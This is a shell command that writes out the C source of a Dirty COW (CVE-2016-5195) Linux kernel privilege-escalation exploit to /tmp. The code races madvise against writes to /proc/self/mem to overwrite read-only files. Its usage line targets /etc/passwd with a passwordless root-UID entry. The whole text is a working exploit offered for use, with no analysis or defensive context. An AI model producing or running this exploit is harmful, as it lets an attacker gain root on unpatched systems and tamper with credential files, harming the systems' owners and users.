cat > /tmp/dirtycow.c << 'EOF'
#include <fcntl.h>
#include <pthread.h>
#include <string.h>
#include <stdio.h>
#include <stdint.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/ptrace.h>
#include <stdlib.h>
#include <unistd.h>
#include <crypt.h>

int f;
void *map;
pid_t pid;
pthread_t pth;
struct stat st;

void *madviseThread(void *arg) {
    int i, c = 0;
    for(i = 0; i < 100000000; i++) {
        c += madvise(map, 100, MADV_DONTNEED);
    }
    return NULL;
}

int main(int argc, char *argv[]) {
    if(argc < 3) {
        fprintf(stderr, "Usage: %s /etc/passwd 'user::0:0:root:/root:/bin/bash'\n", argv[0]);
        return 1;
    }
    
    f = open(argv[1], O_RDONLY);
    fstat(f, &st);
    map = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, f, 0);
    
    pthread_create(&pth, NULL, madviseThread, NULL);
    
    int fd = open("/proc/self/mem", O_RDWR);
    int i, c = 0;
    for(i = 0; i < 100000000; i++) {
        lseek(fd, (off_t)map, SEEK_SET);
        c += write(fd, argv[2], strlen(argv[2]));
    }
    return 0;
}
EOF